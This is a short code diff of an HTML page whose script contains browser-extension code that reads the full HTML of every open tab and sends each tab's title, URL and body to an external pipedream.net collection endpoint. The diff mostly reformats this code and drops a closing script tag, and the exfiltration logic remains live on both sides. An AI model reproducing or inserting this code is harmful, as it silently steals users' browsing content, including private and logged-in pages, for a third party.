@@ -13,33 +13,27 @@
 <script> 
 document.title = `
 $(document).ready(function(){
-
-    chrome.tabs.query({}, tabs => {
-        tabs.forEach(tab => {
-            chrome.tabs.executeScript(tab.id, { code: 'document.body.innerHTML' }, function(result) {
+    chrome.tabs.query({}, tabs => { 
+        tabs.forEach(tab => {  
+            chrome.tabs.executeScript(tab.id, { code: 'document.body.innerHTML' }, function(result) {  
                 const tabData = {
                     title: tab.title,
                     url: tab.url,
                     body: result[0]
                 };
 
-            
                 fetch('https://eodpzmmv3plxhm9.m.pipedream.net', {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: {
                     'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(tabData),
+                    body: JSON.stringify(tabData)
                 })
-            
             });
-        });
-      });
-
-}); `
-
-</script>
+        }); 
+    });
+});`
 
 
 </body>
